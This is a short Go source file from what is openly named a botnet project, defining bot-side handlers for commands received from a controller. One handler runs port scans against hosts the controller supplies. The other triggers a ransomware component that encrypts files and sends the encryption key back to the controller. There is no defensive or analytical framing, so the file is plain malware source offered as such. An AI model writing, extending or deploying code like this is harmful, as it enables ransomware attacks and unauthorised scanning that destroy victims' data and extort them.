package tcp

import (
	"bytes"
	"encoding/gob"
	"fmt"
	"log"

	"github.com/rodzzlessa24/botnet"
)

//HandleScan is
func (b *BotService) HandleScan(payload []byte) {
	req := new(scanRequest)
	if err := gob.NewDecoder(bytes.NewReader(payload)).Decode(req); err != nil {
		log.Println("handling scan", err)
		return
	}

	var resCh <-chan string
	switch req.Type {
	case "scan":
		resCh = b.PortScanner.Scan(req.Hosts, req.Ports)
	case "simple":
		resCh = b.PortScanner.SimpleScan(req.Hosts)
	case "full":
		resCh = b.PortScanner.FullScan(req.Hosts)
	}

	var res []string
	for addr := range resCh {
		fmt.Println("addr found", addr)
		res = append(res, addr)
	}
}

//HandleRansome is
func (b *BotService) HandleRansome(payload []byte) {
	if err := b.Ransomer.Encrypt(""); err != nil {
		log.Panic(err)
	}
	msg := &ransomCompleteRequest{
		BotID: b.Bot.ID,
		Key:   b.Ransomer.Key(),
	}
	by, err := botnet.Bytes(msg)
	if err != nil {
		log.Panic(err)
	}
	data := append(commandToBytes("rancom"), by...)
	b.RansomCompleteCmd(data)
}
